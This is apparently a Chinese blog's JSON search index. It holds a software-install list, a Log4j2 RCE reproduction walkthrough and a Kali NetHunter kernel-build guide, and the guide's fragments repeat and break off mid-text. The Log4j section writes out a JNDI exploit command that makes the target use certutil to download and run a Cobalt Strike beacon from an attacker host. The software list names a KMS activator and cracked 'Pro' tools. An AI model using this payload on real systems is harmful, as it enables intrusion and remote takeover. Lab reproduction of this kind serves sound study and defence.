[{"categories":null,"content":" 1 Windows 原版镜像网站MSDN, 我告诉你 NEXT, ITELLYOU ","date":"2022-07-22","objectID":"/software/:1:0","series":null,"tags":null,"title":"我的装机必备软件清单","uri":"/software/#windows-原版镜像网站"},{"categories":null,"content":" 2 装机 PE 工具箱微PE工具箱 - 超好用的WinPE装机维护工具 Edgeless - 强大而优雅的半开源PE工具 FirPe Project - 也许是最适合年轻人使用的第三方WinPE~ ","date":"2022-07-22","objectID":"/software/:2:0","series":null,"tags":null,"title":"我的装机必备软件清单","uri":"/software/#装机-pe-工具箱"},{"categories":null,"content":" 3 U盘启动制作工具Ventoy - 新一代多系统启动U盘解决方案 Rufus - 轻松创建USB启动盘 balenaEtcher - Flash OS images to SD cards \u0026 USB drives, safely and easily. UltraISO 软碟通 ","date":"2022-07-22","objectID":"/software/:3:0","series":null,"tags":null,"title":"我的装机必备软件清单","uri":"/software/#u盘启动制作工具"},{"categories":null,"content":" 4 硬件检测工具箱图吧工具箱 卡硬工具箱 ","date":"2022-07-22","objectID":"/software/:4:0","series":null,"tags":null,"title":"我的装机必备软件清单","uri":"/software/#硬件检测工具箱"},{"categories":null,"content":" 5 软件资源网站果核剥壳 - 互联网的净土 AppHot - 软件汉化，手机应用，绿色，好玩，烈火与您共分享 423Down mefcl’blog - 分享纯净好资源 /landian/soft/ ","date":"2022-07-22","objectID":"/software/:5:0","series":null,"tags":null,"title":"我的装机必备软件清单","uri":"/software/#软件资源网站"},{"categories":null,"content":" 6 装机必备软件","date":"2022-07-22","objectID":"/software/:6:0","series":null,"tags":null,"title":"我的装机必备软件清单","uri":"/software/#装机必备软件"},{"categories":null,"content":" 6.1 激活工具HEU KMS Activator Office Tool Plus 官方网站 - 一键部署Office ","date":"2022-07-22","objectID":"/software/:6:1","series":null,"tags":null,"title":"我的装机必备软件清单","uri":"/software/#激活工具"},{"categories":null,"content":" 6.2 驱动安装360驱动大师精简单文件版 ","date":"2022-07-22","objectID":"/software/:6:2","series":null,"tags":null,"title":"我的装机必备软件清单","uri":"/software/#驱动安装"},{"categories":null,"content":" 6.3 安全软件火绒安全软件 ","date":"2022-07-22","objectID":"/software/:6:3","series":null,"tags":null,"title":"我的装机必备软件清单","uri":"/software/#安全软件"},{"categories":null,"content":" 6.4 系统优化DISM++ Wise Care 365 Pro CCleaner Pro Wise Registry Cleaner Pro ","date":"2022-07-22","objectID":"/software/:6:4","series":null,"tags":null,"title":"我的装机必备软件清单","uri":"/software/#系统优化"},{"categories":null,"content":" 6.5 常用运行库微软常用运行库合集 微软.NET离线运行库合集 VisualCppRedist运行库合集 ","date":"2022-07-22","objectID":"/software/:6:5","series":null,"tags":null,"title":"我的装机必备软件清单","uri":"/software/#常用运行库"},{"categories":null,"content":" 6.6 磁盘分区 \u0026 数据恢复DiskGenius R-Studio 傲梅分区助手 ","date":"2022-07-22","objectID":"/software/:6:6","series":null,"tags":null,"title":"我的装机必备软件清单","uri":"/software/#磁盘分区--数据恢复"},{"categories":null,"content":" 6.7 输入法搜狗输入法 去广告安装版 ","date":"2022-07-22","objectID":"/software/:6:7","series":null,"tags":null,"title":"我的装机必备软件清单","uri":"/software/#输入法"},{"categories":null,"content":" 6.8 即时通讯腾讯QQ PC微信 钉钉 Telegram ","date":"2022-07-22","objectID":"/software/:6:8","series":null,"tags":null,"title":"我的装机必备软件清单","uri":"/software/#即时通讯"},{"categories":null,"content":" 6.9 影音娱乐QQ音乐 去广告绿色版 洛雪音乐助手 腾讯视频 去广告纯净版 PotPlayer (网络播放器) 抖音PC版 ","date":"2022-07-22","objectID":"/software/:6:9","series":null,"tags":null,"title":"我的装机必备软件清单","uri":"/software/#影音娱乐"},{"categories":null,"content":" 6.10 视频剪辑剪映专业版 必剪 Kdenlive - 自由开源的免费视频编辑软件 ","date":"2022-07-22","objectID":"/software/:6:10","series":null,"tags":null,"title":"我的装机必备软件清单","uri":"/software/#视频剪辑"},{"categories":null,"content":" 6.11 录屏截图Snipaste 截图工具 QQScreenShot(QQ截图) 提取版 OBS Studio 录屏工具 Bandicam 录屏工具 ","date":"2022-07-22","objectID":"/software/:6:11","series":null,"tags":null,"title":"我的装机必备软件清单","uri":"/software/#录屏截图"},{"categories":null,"content":" 6.12 下载工具Internet Download Manager 迅雷11绿色精简版 Motrix - 一款全能的下载工具 qBittorrent(BT种子下载器) 便携版 阿里云盘小白羊版 百度网盘 PC客户端 绿色纯净版 ","date":"2022-07-22","objectID":"/software/:6:12","series":null,"tags":null,"title":"我的装机必备软件清单","uri":"/software/#下载工具"},{"categories":null,"content":" 6.13 浏览器Google Chrome 谷歌浏览器官方版 Google Chrome 谷歌浏览器便携增强版 Microsoft Edge 官方版 Microsoft Edge 便携增强版 FireFox 官方版 ","date":"2022-07-22","objectID":"/software/:6:13","series":null,"tags":null,"title":"我的装机必备软件清单","uri":"/software/#浏览器"},{"categories":null,"content":" 6.14 压缩解压工具WinRAR 正式版 安装版 便携版 7-Zip ","date":"2022-07-22","objectID":"/software/:6:14","series":null,"tags":null,"title":"我的装机必备软件清单","uri":"/software/#压缩解压工具"},{"categories":null,"content":" 6.15 远程控制工具向日葵远程控制软件 ToDesk远程控制软件 TeamViewer远程控制软件 ","date":"2022-07-22","objectID":"/software/:6:15","series":null,"tags":null,"title":"我的装机必备软件清单","uri":"/software/#远程控制工具"},{"categories":null,"content":" 6.16 编程开发 6.16.1 编程语言Python Java Golang 6.16.2 开发IDEVisual Studio Code Visual Studio PyCharm IntelliJ IDEA GitHub Desktop ","date":"2022-07-22","objectID":"/software/:6:16","series":null,"tags":null,"title":"我的装机必备软件清单","uri":"/software/#编程开发"},{"categories":null,"content":" 6.16 编程开发 6.16.1 编程语言Python Java Golang 6.16.2 开发IDEVisual Studio Code Visual Studio PyCharm IntelliJ IDEA GitHub Desktop ","date":"2022-07-22","objectID":"/software/:6:16","series":null,"tags":null,"title":"我的装机必备软件清单","uri":"/software/#编程语言"},{"categories":null,"content":" 6.16 编程开发 6.16.1 编程语言Python Java Golang 6.16.2 开发IDEVisual Studio Code Visual Studio PyCharm IntelliJ IDEA GitHub Desktop ","date":"2022-07-22","objectID":"/software/:6:16","series":null,"tags":null,"title":"我的装机必备软件清单","uri":"/software/#开发ide"},{"categories":null,"content":" 6.17 效率软件Everything uTools - 新一代效率工具平台 LocalSend - 将文件共享到附近的设备。免费、开源、跨平台。 Maye一个简洁小巧的快速启动工具 Rolan v2.2.0 绿色修改版 ","date":"2022-07-22","objectID":"/software/:6:17","series":null,"tags":null,"title":"我的装机必备软件清单","uri":"/software/#效率软件"},{"categories":null,"content":" 6.18 卸载工具HiBit Uninstaller Geek Uninstaller Iobit Uninstaller Revo Uninstaller ","date":"2022-07-22","objectID":"/software/:6:18","series":null,"tags":null,"title":"我的装机必备软件清单","uri":"/software/#卸载工具"},{"categories":null,"content":" 6.19 虚拟机VMware Workstation免激活精简版 Oracle VM VirtualBox ","date":"2022-07-22","objectID":"/software/:6:19","series":null,"tags":null,"title":"我的装机必备软件清单","uri":"/software/#虚拟机"},{"categories":["Web安全"],"content":"本文介绍了Apache Log4j2 漏洞的复现过程以及修复方案。","date":"2021-12-30","objectID":"/2021/12/30/log4j2-rce.html/","series":null,"tags":["网络安全","漏洞复现","CobaltStrike"],"title":"Log4j2 RCE漏洞复现","uri":"/2021/12/30/log4j2-rce.html/"},{"categories":["Web安全"],"content":" 1 前言Apache Log4j2是一款优秀的Java日志记录框架。近日，阿里云安全团队向Apache官方报告了Apache Log4j2远程代码执行漏洞。由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证， Apache Struts2，Apache Solr， Apache Druid， Apache Flink等均受影响。 ","date":"2021-12-30","objectID":"/2021/12/30/log4j2-rce.html/:1:0","series":null,"tags":["网络安全","漏洞复现","CobaltStrike"],"title":"Log4j2 RCE漏洞复现","uri":"/2021/12/30/log4j2-rce.html/#前言"},{"categories":["Web安全"],"content":" 1.1 漏洞评级 影响产品 漏洞类型 漏洞评级 Apache Log4j 远程代码执行漏洞 严重 ","date":"2021-12-30","objectID":"/2021/12/30/log4j2-rce.html/:1:1","series":null,"tags":["网络安全","漏洞复现","CobaltStrike"],"title":"Log4j2 RCE漏洞复现","uri":"/2021/12/30/log4j2-rce.html/#漏洞评级"},{"categories":["Web安全"],"content":" 1.2 漏洞复现首先去GitHub下载漏洞poc代码环境，使用IDEA加载项目文件 打开项目文件src/main/java/log4j 在其中添加一行代码 System.setProperty(\"com.sun.jndi.ldap.object.trustURLCodebase\",\"true\"); 接着去GitHub上下载JNDI注入工具 ","date":"2021-12-30","objectID":"/2021/12/30/log4j2-rce.html/:1:2","series":null,"tags":["网络安全","漏洞复现","CobaltStrike"],"title":"Log4j2 RCE漏洞复现","uri":"/2021/12/30/log4j2-rce.html/#漏洞复现"},{"categories":["Web安全"],"content":" 1.3 生成EXP java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C \"calc\" -A \"192.168.31.201\" 将生成的EXP代码复制到漏洞POC代码中 ","date":"2021-12-30","objectID":"/2021/12/30/log4j2-rce.html/:1:3","series":null,"tags":["网络安全","漏洞复现","CobaltStrike"],"title":"Log4j2 RCE漏洞复现","uri":"/2021/12/30/log4j2-rce.html/#生成exp"},{"categories":["Web安全"],"content":" 1.4 运行POC点击IDEA工具栏运行 成功弹出计算器！漏洞利用成功！ ","date":"2021-12-30","objectID":"/2021/12/30/log4j2-rce.html/:1:4","series":null,"tags":["网络安全","漏洞复现","CobaltStrike"],"title":"Log4j2 RCE漏洞复现","uri":"/2021/12/30/log4j2-rce.html/#运行poc"},{"categories":["Web安全"],"content":" 1.5 反弹Shell上线CS运行CobaltStrike teamserver teamserver.bat 192.168.31.201 123456 打开CobaltStrike连接 新建监听器保存 点击攻击 –\u003e 生成后门 –\u003e Windows可执行程序Stageless 选择生成的监听器，输出格式exe 点击保存 ","date":"2021-12-30","objectID":"/2021/12/30/log4j2-rce.html/:1:5","series":null,"tags":["网络安全","漏洞复现","CobaltStrike"],"title":"Log4j2 RCE漏洞复现","uri":"/2021/12/30/log4j2-rce.html/#反弹shell上线cs"},{"categories":["Web安全"],"content":" 1.6 启动Web服务在生成的exe payload目录执行： python -m http.server 8080 浏览器访问验证 ","date":"2021-12-30","objectID":"/2021/12/30/log4j2-rce.html/:1:6","series":null,"tags":["网络安全","漏洞复现","CobaltStrike"],"title":"Log4j2 RCE漏洞复现","uri":"/2021/12/30/log4j2-rce.html/#启动web服务"},{"categories":["Web安全"],"content":" 1.7 构造CS上线payload java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C \"certutil -urlcache -split -f http://192.168.31.201:8080/beacon.exe C:\\Users\\a.exe\u0026\u0026C:\\Users\\a.exe\" -A \"192.168.31.201\" 将生成好的payload粘贴到POC代码中 点击运行 成功上线！ ","date":"2021-12-30","objectID":"/2021/12/30/log4j2-rce.html/:1:7","series":null,"tags":["网络安全","漏洞复现","CobaltStrike"],"title":"Log4j2 RCE漏洞复现","uri":"/2021/12/30/log4j2-rce.html/#构造cs上线payload"},{"categories":["Web安全"],"content":" 1.8 演示视频 ","date":"2021-12-30","objectID":"/2021/12/30/log4j2-rce.html/:1:8","series":null,"tags":["网络安全","漏洞复现","CobaltStrike"],"title":"Log4j2 RCE漏洞复现","uri":"/2021/12/30/log4j2-rce.html/#演示视频"},{"categories":["Web安全"],"content":" 1.9 漏洞缓解措施（1）尽快升级至最新版本 https://github.com/apache/logging-log4j2/ ; 尽快升级Apache Log4j2所有相关应用到最新的log4j-2.15.0-rc2版本 https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2 (2)安装杀毒软件更新最新补丁程序 ","date":"2021-12-30","objectID":"/2021/12/30/log4j2-rce.html/:1:9","series":null,"tags":["网络安全","漏洞复现","CobaltStrike"],"title":"Log4j2 RCE漏洞复现","uri":"/2021/12/30/log4j2-rce.html/#漏洞缓解措施"},{"categories":["Web安全"],"content":" 1.10 总结本篇文章介绍了Apache Log4j2 远程代码执行漏洞的风险及漏洞利用过程，以简单直观的过程告知用户其危害以及防护措施。 ","date":"2021-12-30","objectID":"/2021/12/30/log4j2-rce.html/:1:10","series":null,"tags":["网络安全","漏洞复现","CobaltStrike"],"title":"Log4j2 RCE漏洞复现","uri":"/2021/12/30/log4j2-rce.html/#总结"},{"categories":["Web安全"],"content":" 1.11 相关链接https://mp.weixin.qq.com/s/AuBchaUvFw2pisVw6rNX5A https://github.com/y35uishere/apache-log4j-poc https://github.com/welk1n/JNDI-Injection-Exploit ","date":"2021-12-30","objectID":"/2021/12/30/log4j2-rce.html/:1:11","series":null,"tags":["网络安全","漏洞复现","CobaltStrike"],"title":"Log4j2 RCE漏洞复现","uri":"/2021/12/30/log4j2-rce.html/#相关链接"},{"categories":["kali"],"content":"本文主要介绍Kali Linux NetHunter内核的编译适配过程。","date":"2021-09-12","objectID":"/2021/09/12/build-nethunter-kernel.html/","series":null,"tags":["NetHunter","Android","Kernel","内核编译"],"title":"Kali Linux NetHunter内核编译指南","uri":"/2021/09/12/build-nethunter-kernel.html/"},{"categories":["kali"],"content":" 1 0x00 前言近年来随着各种HVV活动的兴起，各种新的概念层出不穷。其中就有近源渗透这个概念。 黑客行走江湖，哪儿能没有些趁手的兵器装备呢？ 相信很多人都曾梦想过拥有一台黑客专属手机，走到哪儿黑到哪儿。那么现实中这样的手机存在吗？答案是肯定的！NetHunter就能满足你所有的需求！ Kali Linux NetHunter是由Offensive-Security团队打造的基于Android平台的渗透测试环境。 通过使用Kali Linux NetHunter我们可以使用诸如外接无线网卡破解WiFi，模拟BadUSB设备进行HID攻击，外接USB蓝牙适配器进行蓝牙攻击……等各种近源渗透活动。 在Kali Linux NetHunter官网我们可以查阅官方支持的设备型号列表。 1.0.1 对读者的要求如果你会玩安卓刷机且手机型号恰好被官方支持，那么直接按照官方教程一步步来就好。 如果很不幸你的手机不被官方所支持但你会玩Linux且懂一些安卓开发以及C语言方面的知识想给自己的手机适配NetHunter，那么本篇教程就带你如何给一台不被官方支持的手机适配Kali NetHunter。 1.0.2 开始前的准备· 一台能解锁BootLoader且内核源码开源的安卓手机 · 一台高性能x86_64 PC 1.0.3 内核源码的选择一般来说，手机厂商开源的内核源码代码质量参差不齐（一言难尽），如果我们要选择自己适配NetHunter的话最好选择知名第三方开发者Fork的源码进行编译。 比较知名的有： · LineageOS · PixelExperience · crDroid · MoKee · Havoc-OS · Arter97 …等，这里不再一一列举。 1.0.4 交叉编译工具链的选择对于较老版本的内核（3.18.x以下）的一般是使用Google GCC4.9 对于较新版本的内核（4.4.x以上）的建议使用Clang来编译 对于Google gcc编译器，使用以下命令下载 64位： git clone https://mirrors.bfsu.edu.cn/git/AOSP/platform/prebuilts/gcc/linux-x86/aarch64/aarch64-linux-android-4.9 -b android-10.0.0_r32 --depth=1 32位： git clone https://mirrors.bfsu.edu.cn/git/AOSP/platform/prebuilts/gcc/linux-x86/arm/arm-linux-androideabi-4.9 -b android-10.0.0_r32 --depth=1 对于Clang编译器，使用以下命令下载 Google官方Clang： git clone https://mirrors.bfsu.edu.cn/git/AOSP/platform/prebuilts/clang/host/linux-x86 --depth=1 Proton-clang: git clone https://github.com/kdrag0n/proton-clang.git --depth=1 1.0.5 如何查找自己手机的内核源码对于已经开源内核源码的手机来说，一般只需要在GitHub上搜索关键字就能找到适合你的内核源码 一般搜索的关键字为android_kernel_\u003c设备厂商名\u003e_\u003c设备CPU代号名\u003e 或者kernel_\u003c设备厂商名\u003e_\u003c设备CPU代号\u003e 又或者kernel_\u003c设备厂商名\u003e_\u003c设备代号\u003e 举个例子来说，我的设备是小米Redmi 4X，设备厂商是xiaomi，CPU代号是MSM8937，设备代号是santoni那么就可以在GitHub上搜索关键字android_kernel_xiaomi_msm8937或者kernel_xiaomi_santoni或者kernel_xiaomi_msm8937来找对应设备的内核源码。 这里还要注意的一点是所选取的内核源码尽量要与当前手机所使用的ROM Android版本对应，比如如果手机所使用的ROM是LineageOS的那就去找LineageOS所对应的内核源码，且分支也要一一对应。 当然你也可以选择在XDA论坛寻找其他第三方优秀作者提供的内核源码。 ","date":"2021-09-12","objectID":"/2021/09/12/build-nethunter-kernel.html/:1:0","series":null,"tags":["NetHunter","Android","Kernel","内核编译"],"title":"Kali Linux NetHunter内核编译指南","uri":"/2021/09/12/build-nethunter-kernel.html/#0x00-前言"},{"categories":["kali"],"content":" 1 0x00 前言近年来随着各种HVV活动的兴起，各种新的概念层出不穷。其中就有近源渗透这个概念。 黑客行走江湖，哪儿能没有些趁手的兵器装备呢？ 相信很多人都曾梦想过拥有一台黑客专属手机，走到哪儿黑到哪儿。那么现实中这样的手机存在吗？答案是肯定的！NetHunter就能满足你所有的需求！ Kali Linux NetHunter是由Offensive-Security团队打造的基于Android平台的渗透测试环境。 通过使用Kali Linux NetHunter我们可以使用诸如外接无线网卡破解WiFi，模拟BadUSB设备进行HID攻击，外接USB蓝牙适配器进行蓝牙攻击……等各种近源渗透活动。 在Kali Linux NetHunter官网我们可以查阅官方支持的设备型号列表。 1.0.1 对读者的要求如果你会玩安卓刷机且手机型号恰好被官方支持，那么直接按照官方教程一步步来就好。 如果很不幸你的手机不被官方所支持但你会玩Linux且懂一些安卓开发以及C语言方面的知识想给自己的手机适配NetHunter，那么本篇教程就带你如何给一台不被官方支持的手机适配Kali NetHunter。 1.0.2 开始前的准备· 一台能解锁BootLoader且内核源码开源的安卓手机 · 一台高性能x86_64 PC 1.0.3 内核源码的选择一般来说，手机厂商开源的内核源码代码质量参差不齐（一言难尽），如果我们要选择自己适配NetHunter的话最好选择知名第三方开发者Fork的源码进行编译。 比较知名的有： · LineageOS · PixelExperience · crDroid · MoKee · Havoc-OS · Arter97 …等，这里不再一一列举。 1.0.4 交叉编译工具链的选择对于较老版本的内核（3.18.x以下）的一般是使用Google GCC4.9 对于较新版本的内核（4.4.x以上）的建议使用Clang来编译 对于Google gcc编译器，使用以下命令下载 64位： git clone https://mirrors.bfsu.edu.cn/git/AOSP/platform/prebuilts/gcc/linux-x86/aarch64/aarch64-linux-android-4.9 -b android-10.0.0_r32 --depth=1 32位： git clone https://mirrors.bfsu.edu.cn/git/AOSP/platform/prebuilts/gcc/linux-x86/arm/arm-linux-androideabi-4.9 -b android-10.0.0_r32 --depth=1 对于Clang编译器，使用以下命令下载 Google官方Clang： git clone https://mirrors.bfsu.edu.cn/git/AOSP/platform/prebuilts/clang/host/linux-x86 --depth=1 Proton-clang: git clone https://github.com/kdrag0n/proton-clang.git --depth=1 1.0.5 如何查找自己手机的内核源码对于已经开源内核源码的手机来说，一般只需要在GitHub上搜索关键字就能找到适合你的内核源码 一般搜索的关键字为android_kernel_\u003c设备厂商名\u003e_\u003c设备CPU代号名\u003e 或者kernel_\u003c设备厂商名\u003e_\u003c设备CPU代号\u003e 又或者kernel_\u003c设备厂商名\u003e_\u003c设备代号\u003e 举个例子来说，我的设备是小米Redmi 4X，设备厂商是xiaomi，CPU代号是MSM8937，设备代号是santoni那么就可以在GitHub上搜索关键字android_kernel_xiaomi_msm8937或者kernel_xiaomi_santoni或者kernel_xiaomi_msm8937来找对应设备的内核源码。 这里还要注意的一点是所选取的内核源码尽量要与当前手机所使用的ROM Android版本对应，比如如果手机所使用的ROM是LineageOS的那就去找LineageOS所对应的内核源码，且分支也要一一对应。 当然你也可以选择在XDA论坛寻找其他第三方优秀作者提供的内核源码。 ","date":"2021-09-12","objectID":"/2021/09/12/build-nethunter-kernel.html/:1:0","series":null,"tags":["NetHunter","Android","Kernel","内核编译"],"title":"Kali Linux NetHunter内核编译指南","uri":"/2021/09/12/build-nethunter-kernel.html/#对读者的要求"},{"categories":["kali"],"content":" 1 0x00 前言近年来随着各种HVV活动的兴起，各种新的概念层出不穷。其中就有近源渗透这个概念。 黑客行走江湖，哪儿能没有些趁手的兵器装备呢？ 相信很多人都曾梦想过拥有一台黑客专属手机，走到哪儿黑到哪儿。那么现实中这样的手机存在吗？答案是肯定的！NetHunter就能满足你所有的需求！ Kali Linux NetHunter是由Offensive-Security团队打造的基于Android平台的渗透测试环境。 通过使用Kali Linux NetHunter我们可以使用诸如外接无线网卡破解WiFi，模拟BadUSB设备进行HID攻击，外接USB蓝牙适配器进行蓝牙攻击……等各种近源渗透活动。 在Kali Linux NetHunter官网我们可以查阅官方支持的设备型号列表。 1.0.1 对读者的要求如果你会玩安卓刷机且手机型号恰好被官方支持，那么直接按照官方教程一步步来就好。 如果很不幸你的手机不被官方所支持但你会玩Linux且懂一些安卓开发以及C语言方面的知识想给自己的手机适配NetHunter，那么本篇教程就带你如何给一台不被官方支持的手机适配Kali NetHunter。 1.0.2 开始前的准备· 一台能解锁BootLoader且内核源码开源的安卓手机 · 一台高性能x86_64 PC 1.0.3 内核源码的选择一般来说，手机厂商开源的内核源码代码质量参差不齐（一言难尽），如果我们要选择自己适配NetHunter的话最好选择知名第三方开发者Fork的源码进行编译。 比较知名的有： · LineageOS · PixelExperience · crDroid · MoKee · Havoc-OS · Arter97 …等，这里不再一一列举。 1.0.4 交叉编译工具链的选择对于较老版本的内核（3.18.x以下）的一般是使用Google GCC4.9 对于较新版本的内核（4.4.x以上）的建议使用Clang来编译 对于Google gcc编译器，使用以下命令下载 64位： git clone https://mirrors.bfsu.edu.cn/git/AOSP/platform/prebuilts/gcc/linux-x86/aarch64/aarch64-linux-android-4.9 -b android-10.0.0_r32 --depth=1 32位： git clone https://mirrors.bfsu.edu.cn/git/AOSP/platform/prebuilts/gcc/linux-x86/arm/arm-linux-androideabi-4.9 -b android-10.0.0_r32 --depth=1 对于Clang编译器，使用以下命令下载 Google官方Clang： git clone https://mirrors.bfsu.edu.cn/git/AOSP/platform/prebuilts/clang/host/linux-x86 --depth=1 Proton-clang: git clone https://github.com/kdrag0n/proton-clang.git --depth=1 1.0.5 如何查找自己手机的内核源码对于已经开源内核源码的手机来说，一般只需要在GitHub上搜索关键字就能找到适合你的内核源码 一般搜索的关键字为android_kernel_\u003c设备厂商名\u003e_\u003c设备CPU代号名\u003e 或者kernel_\u003c设备厂商名\u003e_\u003c设备CPU代号\u003e 又或者kernel_\u003c设备厂商名\u003e_\u003c设备代号\u003e 举个例子来说，我的设备是小米Redmi 4X，设备厂商是xiaomi，CPU代号是MSM8937，设备代号是santoni那么就可以在GitHub上搜索关键字android_kernel_xiaomi_msm8937或者kernel_xiaomi_santoni或者kernel_xiaomi_msm8937来找对应设备的内核源码。 这里还要注意的一点是所选取的内核源码尽量要与当前手机所使用的ROM Android版本对应，比如如果手机所使用的ROM是LineageOS的那就去找LineageOS所对应的内核源码，且分支也要一一对应。 当然你也可以选择在XDA论坛寻找其他第三方优秀作者提供的内核源码。 ","date":"2021-09-12","objectID":"/2021/09/12/build-nethunter-kernel.html/:1:0","series":null,"tags":["NetHunter","Android","Kernel","内核编译"],"title":"Kali Linux NetHunter内核编译指南","uri":"/2021/09/12/build-nethunter-kernel.html/#开始前的准备"},{"categories":["kali"],"content":" 1 0x00 前言近年来随着各种HVV活动的兴起，各种新的概念层出不穷。其中就有近源渗透这个概念。 黑客行走江湖，哪儿能没有些趁手的兵器装备呢？ 相信很多人都曾梦想过拥有一台黑客专属手机，走到哪儿黑到哪儿。那么现实中这样的手机存在吗？答案是肯定的！NetHunter就能满足你所有的需求！ Kali Linux NetHunter是由Offensive-Security团队打造的基于Android平台的渗透测试环境。 通过使用Kali Linux NetHunter我们可以使用诸如外接无线网卡破解WiFi，模拟BadUSB设备进行HID攻击，外接USB蓝牙适配器进行蓝牙攻击……等各种近源渗透活动。 在Kali Linux NetHunter官网我们可以查阅官方支持的设备型号列表。 1.0.1 对读者的要求如果你会玩安卓刷机且手机型号恰好被官方支持，那么直接按照官方教程一步步来就好。 如果很不幸你的手机不被官方所支持但你会玩Linux且懂一些安卓开发以及C语言方面的知识想给自己的手机适配NetHunter，那么本篇教程就带你如何给一台不被官方支持的手机适配Kali NetHunter。 1.0.2 开始前的准备· 一台能解锁BootLoader且内核源码开源的安卓手机 · 一台高性能x86_64 PC 1.0.3 内核源码的选择一般来说，手机厂商开源的内核源码代码质量参差不齐（一言难尽），如果我们要选择自己适配NetHunter的话最好选择知名第三方开发者Fork的源码进行编译。 比较知名的有： · LineageOS · PixelExperience · crDroid · MoKee · Havoc-OS · Arter97 …等，这里不再一一列举。 1.0.4 交叉编译工具链的选择对于较老版本的内核（3.18.x以下）的一般是使用Google GCC4.9 对于较新版本的内核（4.4.x以上）的建议使用Clang来编译 对于Google gcc编译器，使用以下命令下载 64位： git clone https://mirrors.bfsu.edu.cn/git/AOSP/platform/prebuilts/gcc/linux-x86/aarch64/aarch64-linux-android-4.9 -b android-10.0.0_r32 --depth=1 32位： git clone https://mirrors.bfsu.edu.cn/git/AOSP/platform/prebuilts/gcc/linux-x86/arm/arm-linux-androideabi-4.9 -b android-10.0.0_r32 --depth=1 对于Clang编译器，使用以下命令下载 Google官方Clang： git clone https://mirrors.bfsu.edu.cn/git/AOSP/platform/prebuilts/clang/host/linux-x86 --depth=1 Proton-clang: git clone https://github.com/kdrag0n/proton-clang.git --depth=1 1.0.5 如何查找自己手机的内核源码对于已经开源内核源码的手机来说，一般只需要在GitHub上搜索关键字就能找到适合你的内核源码 一般搜索的关键字为android_kernel_\u003c设备厂商名\u003e_\u003c设备CPU代号名\u003e 或者kernel_\u003c设备厂商名\u003e_\u003c设备CPU代号\u003e 又或者kernel_\u003c设备厂商名\u003e_\u003c设备代号\u003e 举个例子来说，我的设备是小米Redmi 4X，设备厂商是xiaomi，CPU代号是MSM8937，设备代号是santoni那么就可以在GitHub上搜索关键字android_kernel_xiaomi_msm8937或者kernel_xiaomi_santoni或者kernel_xiaomi_msm8937来找对应设备的内核源码。 这里还要注意的一点是所选取的内核源码尽量要与当前手机所使用的ROM Android版本对应，比如如果手机所使用的ROM是LineageOS的那就去找LineageOS所对应的内核源码，且分支也要一一对应。 当然你也可以选择在XDA论坛寻找其他第三方优秀作者提供的内核源码。 ","date":"2021-09-12","objectID":"/2021/09/12/build-nethunter-kernel.html/:1:0","series":null,"tags":["NetHunter","Android","Kernel","内核编译"],"title":"Kali Linux NetHunter内核编译指南","uri":"/2021/09/12/build-nethunter-kernel.html/#内核源码的选择"},{"categories":["kali"],"content":" 1 0x00 前言近年来随着各种HVV活动的兴起，各种新的概念层出不穷。其中就有近源渗透这个概念。 黑客行走江湖，哪儿能没有些趁手的兵器装备呢？ 相信很多人都曾梦想过拥有一台黑客专属手机，走到哪儿黑到哪儿。那么现实中这样的手机存在吗？答案是肯定的！NetHunter就能满足你所有的需求！ Kali Linux NetHunter是由Offensive-Security团队打造的基于Android平台的渗透测试环境。 通过使用Kali Linux NetHunter我们可以使用诸如外接无线网卡破解WiFi，模拟BadUSB设备进行HID攻击，外接USB蓝牙适配器进行蓝牙攻击……等各种近源渗透活动。 在Kali Linux NetHunter官网我们可以查阅官方支持的设备型号列表。 1.0.1 对读者的要求如果你会玩安卓刷机且手机型号恰好被官方支持，那么直接按照官方教程一步步来就好。 如果很不幸你的手机不被官方所支持但你会玩Linux且懂一些安卓开发以及C语言方面的知识想给自己的手机适配NetHunter，那么本篇教程就带你如何给一台不被官方支持的手机适配Kali NetHunter。 1.0.2 开始前的准备· 一台能解锁BootLoader且内核源码开源的安卓手机 · 一台高性能x86_64 PC 1.0.3 内核源码的选择一般来说，手机厂商开源的内核源码代码质量参差不齐（一言难尽），如果我们要选择自己适配NetHunter的话最好选择知名第三方开发者Fork的源码进行编译。 比较知名的有： · LineageOS · PixelExperience · crDroid · MoKee · Havoc-OS · Arter97 …等，这里不再一一列举。 1.0.4 交叉编译工具链的选择对于较老版本的内核（3.18.x以下）的一般是使用Google GCC4.9 对于较新版本的内核（4.4.x以上）的建议使用Clang来编译 对于Google gcc编译器，使用以下命令下载 64位： git clone https://mirrors.bfsu.edu.cn/git/AOSP/platform/prebuilts/gcc/linux-x86/aarch64/aarch64-linux-android-4.9 -b android-10.0.0_r32 --depth=1 32位： git clone https://mirrors.bfsu.edu.cn/git/AOSP/platform/prebuilts/gcc/linux-x86/arm/arm-linux-androideabi-4.9 -b android-10.0.0_r32 --depth=1 对于Clang编译器，使用以下命令下载 Google官方Clang： git clone https://mirrors.bfsu.edu.cn/git/AOSP/platform/prebuilts/clang/host/linux-x86 --depth=1 Proton-clang: git clone https://github.com/kdrag0n/proton-clang.git --depth=1 1.0.5 如何查找自己手机的内核源码对于已经开源内核源码的手机来说，一般只需要在GitHub上搜索关键字就能找到适合你的内核源码 一般搜索的关键字为android_kernel_\u003c设备厂商名\u003e_\u003c设备CPU代号名\u003e 或者kernel_\u003c设备厂商名\u003e_\u003c设备CPU代号\u003e 又或者kernel_\u003c设备厂商名\u003e_\u003c设备代号\u003e 举个例子来说，我的设备是小米Redmi 4X，设备厂商是xiaomi，CPU代号是MSM8937，设备代号是santoni那么就可以在GitHub上搜索关键字android_kernel_xiaomi_msm8937或者kernel_xiaomi_santoni或者kernel_xiaomi_msm8937来找对应设备的内核源码。 这里还要注意的一点是所选取的内核源码尽量要与当前手机所使用的ROM Android版本对应，比如如果手机所使用的ROM是LineageOS的那就去找LineageOS所对应的内核源码，且分支也要一一对应。 当然你也可以选择在XDA论坛寻找其他第三方优秀作者提供的内核源码。 ","date":"2021-09-12","objectID":"/2021/09/12/build-nethunter-kernel.html/:1:0","series":null,"tags":["NetHunter","Android","Kernel","内核编译"],"title":"Kali Linux NetHunter内核编译指南","uri":"/2021/09/12/build-nethunter-kernel.html/#交叉编译工具链的选择"},{"categories":["kali"],"content":" 1 0x00 前言近年来随着各种HVV活动的兴起，各种新的概念层出不穷。其中就有近源渗透这个概念。 